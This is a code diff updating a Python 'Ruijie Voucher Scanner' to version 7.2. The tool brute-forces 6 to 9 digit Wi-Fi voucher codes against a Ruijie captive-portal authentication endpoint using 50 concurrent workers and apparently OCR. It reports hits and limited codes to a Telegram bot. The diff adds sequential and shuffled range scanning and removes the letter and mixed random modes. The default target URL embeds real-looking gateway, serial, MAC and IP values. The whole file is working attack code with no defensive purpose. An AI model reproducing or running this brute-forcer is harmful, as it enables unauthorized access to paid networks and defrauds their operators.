@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 # ==============================================
-#  Ruijie Voucher Scanner  —  v7.1 (Render Edition - No Input)
+#  Ruijie Voucher Scanner  —  v7.2 (Sequential + Random)
 # ==============================================
 
 import requests
@@ -57,7 +57,8 @@ def cprint(text, color=C.WHITE, bold=False, end="\n"):
 
 # ========== CONFIG (from Environment Variables) ==========
 TARGET_URL = os.getenv("TARGET_URL", "https://portal-as.ruijienetworks.com/api/auth/wifidog?stage=portal&gw_id=9cce887e2b7e&gw_sn=H1U72QB006007&gw_address=192.168.110.1&gw_port=2060&ip=192.168.110.46&mac=30:f2:3c:ef:bf:37&slot_num=8&nasip=192.168.1.38&ssid=VLAN233&ustate=0&mac_req=1&url=http%3A%2F%2F192.168.0.1%2F&chap_id=%5C140&chap_challenge=%5C037%5C061%5C072%5C122%5C040%5C141%5C252%5C331%5C122%5C375%5C042%5C015%5C130%5C263%5C365%5C222%5C")
-MODE = os.getenv("MODE", "6")  # 6, 7, 8, 9, lower6, lower7, lower8, mixed6, mixed7, mixed8
+MODE = os.getenv("MODE", "6")  # 6, 7, 8, 9
+SCAN_TYPE = os.getenv("SCAN_TYPE", "sequential")  # sequential or random
 THREADS = int(os.getenv("THREADS", "50"))
 TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "")
 TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "")
@@ -235,31 +236,17 @@ async def perform_check(session_url, code):
         send_telegram(f"⚠️ LIMITED CODE: {code}\n{info}")
         cprint(f"\n[-] LIMITED CODE: {code} | {info}", C.YELLOW)
 
-def iter_range_codes(start, end):
+def iter_sequential_codes(start, end):
+    digits = max(len(str(start)), len(str(end)))
+    for i in range(start, end + 1):
+        yield str(i).zfill(digits)
+
+def iter_random_codes(start, end):
     digits = max(len(str(start)), len(str(end)))
     codes = [str(i).zfill(digits) for i in range(start, end + 1)]
     random.shuffle(codes)
     for c in codes:
         yield c
-
-def iter_random_codes(length, count=None):
-    i = 0
-    while count is None or i < count:
-        yield "".join(random.choice(string.digits) for _ in range(length))
-        i += 1
-
-def iter_letter_codes(length, count=None):
-    i = 0
-    while count is None or i < count:
-        yield "".join(random.choice(string.ascii_lowercase) for _ in range(length))
-        i += 1
-
-def iter_mixed_codes(length, count=None):
-    pool = string.ascii_lowercase + string.digits
-    i = 0
-    while count is None or i < count:
-        yield "".join(random.choice(pool) for _ in range(length))
-        i += 1
 
 def stats_printer():
     while not stop_flag:
@@ -269,22 +256,6 @@ def stats_printer():
         sys.stdout.write(f"\r\U0001F552 SPEED: {speed:.1f} c/s | TRIED: {tried} | HITS: {len(hits)}")
         sys.stdout.flush()
     print()
-
-def parse_mode(mode_str):
-    if mode_str == "6":
-        return "digit", 0, 999999
-    elif mode_str == "7":
-        return "digit", 0, 9999999
-    elif mode_str == "8":
-        return "digit", 0, 99999999
-    elif mode_str == "9":
-        return "digit", 0, 999999999
-    elif mode_str.startswith("lower"):
-        return "letter", int(mode_str.replace("lower", "")), None
-    elif mode_str.startswith("mixed"):
-        return "mixed", int(mode_str.replace("mixed", "")), None
-    else:
-        return "digit", 0, 999999
 
 async def run_scan(session_url, start_code, end_code, workers):
     global _voucher_sem, stop_flag, _connector, tried, hits, found_codes, limited_codes, retry_total, start_time
@@ -299,8 +270,14 @@ async def run_scan(session_url, start_code, end_code, workers):
     _voucher_sem = asyncio.Semaphore(workers)
     digits = max(len(str(start_code)), len(str(end_code)))
     total = end_code - start_code + 1
-    code_iter = iter_range_codes(start_code, end_code)
-    cprint(f"\n  [+] Mode: Digit-only ({digits}-digit)", C.CYAN, bold=True)
+    
+    if SCAN_TYPE == "sequential":
+        code_iter = iter_sequential_codes(start_code, end_code)
+        cprint(f"\n  [+] Mode: Sequential ({digits}-digit)", C.CYAN, bold=True)
+    else:
+        code_iter = iter_random_codes(start_code, end_code)
+        cprint(f"\n  [+] Mode: Random ({digits}-digit)", C.CYAN, bold=True)
+    
     cprint(f"  [+] Range: {str(start_code).zfill(digits)} -> {str(end_code).zfill(digits)} ({total:,} codes)", C.YELLOW)
     cprint(f"  [+] Workers: {workers}\n", C.GREEN)
     start_time = time.time()
@@ -341,74 +318,28 @@ async def run_scan(session_url, start_code, end_code, workers):
         cprint("  [-] No valid voucher found.", C.RED)
         send_telegram(f"Scan finished on {session_url}\nTried {tried} codes, no hits.")
 
-async def _run_random_scan(session_url, length, workers, mode_type="digit"):
-    global _voucher_sem, stop_flag, _connector, tried, hits, found_codes, limited_codes, retry_total, start_time
-    _init_ocr()
-    tried = 0
-    hits = []
-    found_codes = []
-    limited_codes = []
-    retry_total = 0
-    stop_flag = False
-    _connector = aiohttp.TCPConnector(limit=workers + 100, ssl=False)
-    _voucher_sem = asyncio.Semaphore(workers)
-    if mode_type == "letter":
-        code_iter = iter_letter_codes(length)
-        mode_label = f"Letter-only ({length}-char a-z)"
-    elif mode_type == "mixed":
-        code_iter = iter_mixed_codes(length)
-        mode_label = f"Mixed ({length}-char a-z+0-9)"
-    else:
-        code_iter = iter_random_codes(length)
-        mode_label = f"Digit-only ({length}-digit)"
-    cprint(f"\n  [+] Mode: {mode_label}", C.CYAN, bold=True)
-    cprint(f"  [+] Workers: {workers} | Infinite random scan\n", C.YELLOW)
-    start_time = time.time()
-    stats_thread = threading.Thread(target=stats_printer, daemon=True)
-    stats_thread.start()
-    checked = 0
-    try:
-        while not stop_flag:
-            batch = []
-            for _ in range(500):
-                try:
-                    batch.append(next(code_iter))
-                except StopIteration:
-                    break
-            if not batch:
-                break
-            async def _check(c):
-                async with _voucher_sem:
-                    await perform_check(session_url, c)
-            await asyncio.gather(*[_check(c) for c in batch], return_exceptions=True)
-            checked += len(batch)
-    except (asyncio.CancelledError, KeyboardInterrupt):
-        stop_flag = True
-    finally:
-        await _connector.close()
-    elapsed = time.time() - start_time
-    cprint(f"\n  [+] Completed in {elapsed:.2f} seconds", C.GREEN, bold=True)
-    cprint(f"      Checked: {checked} | Found: {len(found_codes)} | Limited: {len(limited_codes)}", C.CYAN)
-    if hits:
-        cprint(f"  [+] Voucher found: {hits[0]}", C.GREEN, bold=True)
-        with open(FOUND_FILE, "w") as f:
-            f.write(f"{hits[0]}\n")
-    else:
-        cprint("  [-] No valid voucher found.", C.RED)
-        send_telegram(f"Scan finished\nTried {tried} codes, no hits.")
-
 def main():
     global stop_flag
-    mode_type, start_code, end_code = parse_mode(MODE)
+    if MODE == "6":
+        start_code, end_code = 0, 999999
+    elif MODE == "7":
+        start_code, end_code = 0, 9999999
+    elif MODE == "8":
+        start_code, end_code = 0, 99999999
+    elif MODE == "9":
+        start_code, end_code = 0, 999999999
+    else:
+        cprint(f"  ❌ Invalid MODE: {MODE}", C.RED)
+        sys.exit(1)
+    
     session_url = TARGET_URL
     workers = THREADS
-    cprint(f"\n  🚀 Starting scan with Mode: {MODE}", C.CYAN, bold=True)
+    cprint(f"\n  🚀 Starting scan with Mode: {MODE}-digit", C.CYAN, bold=True)
+    cprint(f"  📡 Scan Type: {SCAN_TYPE}", C.GREEN)
     cprint(f"  📡 URL: {session_url[:60]}...", C.GRAY)
     cprint(f"  ⚡ Workers: {workers}\n", C.GREEN)
-    if mode_type in ("letter", "mixed"):
-        asyncio.run(_run_random_scan(session_url, start_code, workers, mode_type))
-    else:
-        asyncio.run(run_scan(session_url, start_code, end_code, workers))
+    
+    asyncio.run(run_scan(session_url, start_code, end_code, workers))
 
 if __name__ == "__main__":
     try:
